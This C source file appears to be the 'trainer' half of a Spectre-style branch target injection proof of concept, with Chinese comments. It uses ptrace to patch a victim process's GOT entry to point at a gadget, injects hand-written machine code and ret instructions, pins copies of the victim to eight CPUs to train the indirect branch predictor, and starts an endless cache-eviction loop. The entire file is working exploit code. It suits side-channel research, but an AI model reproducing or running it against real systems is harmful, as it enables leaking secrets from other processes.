#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <asm/ptrace-abi.h> /*ORIG_EAX*/
#include <sys/reg.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <semaphore.h>
#include <x86intrin.h>
#include "common.h"

void setcpu(int cpu){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(getpid() , sizeof(mask), &mask);
}

void trainer(char *exe, unsigned plt, unsigned gadget, unsigned *got,int cpu){
    pid_t pid;
    int res;
    int stat;
    unsigned longs, got_out; 
    unsigned long ip;   
    struct user_regs_struct regs;

    pid = fork();
    if(pid == -1){
        error_log("fork");
    }

    if(pid == 0){
        setcpu(cpu);                                //设置子进程的cpu亲和度
        res = ptrace(PTRACE_TRACEME, 0, 0, 0);
        if(res == -1){
            error_log("ptrace");
        }
        execl(exe, exe, "qiutianshu", (char*)0);    //子进程中启动victim
    }

    waitpid(pid, &stat, 0);                         //捕获子进程发出的SIGTRAP信号，获得子进程的控制权
    ptrace(PTRACE_GETREGS, pid, 0, &regs);          //读取17个寄存器的值
    ip = regs.rip;                                  //当前指令寄存器的位置，这里只考虑x86_64的情况
    longs = ptrace(PTRACE_PEEKDATA, pid, plt+2, 0);
    got_out = longs + plt + 6;                      //got表项地址，这里可能需要修改
    *got = got_out;
    
    ptrace(PTRACE_POKEDATA, pid, got_out, gadget);     //gadget地址写入got位置
    ptrace(PTRACE_POKEDATA, pid, gadget, 0xc3c3c3c3);  //gadget地址处写入连续四个ret指令

    union u
    {
        unsigned long val;
        char shellcode[16];                                    
    }loop;
    
    sprintf(loop.shellcode, "\xb8%c%c%c", (plt & 0xff), (plt & 0xff00) >> 8, (plt & 0xff0000) >> 16);              // mov eax, sprintf@plt，这里要调试一下
    ptrace(PTRACE_POKEDATA, pid, ip, loop.val);       
    memcpy(loop.shellcode, "\x00\xff\xd0\xeb",4);       //call eax
    ptrace(PTRACE_POKEDATA, pid, ip + 4, loop.val);
    memcpy(loop.shellcode, "\xfc\x90\x90\x90",4);       //jmp back,nop,nop,nop
    ptrace(PTRACE_POKEDATA, pid, ip + 8, loop.val);
    ptrace(PTRACE_DETACH, pid, 0, 0);                   //调试进程分离，子进程独立运行
}

void evictor(void * got){
    pid_t pid;
    pid = fork();
    if(pid == 0){
        for(;;)
            evict(got);
    }

}

/**
 * 接收参数：victim文件，sprintf@plt(0x4007a0)，gadget(0x400aa5)地址
*/
int main(int argc, char *argv[]){
    unsigned plt, gadget, got;
    char *exe;
    int i;

    if(argc != 4){
        fprintf(stderr, "Usage: %s file strcat@plt gadget", argv[0]);
        exit(EXIT_FAILURE);
    }
    exe = argv[1];                           //victim
    plt = get_long(argv[2]);                 //strcat@plt
    gadget = get_long(argv[3]);              //gadget

    for(i = 0; i < 8; i++){
        trainer(exe, plt, gadget, &got, i);  //训练indirect jump
        printf("cpu%d: got is %x\n", i, got);
    }

    evictor((void *)got);                    //刷新各级缓存的got数据
    for(;;)pause();                          //父进程停在这里
    exit(EXIT_SUCCESS);
}
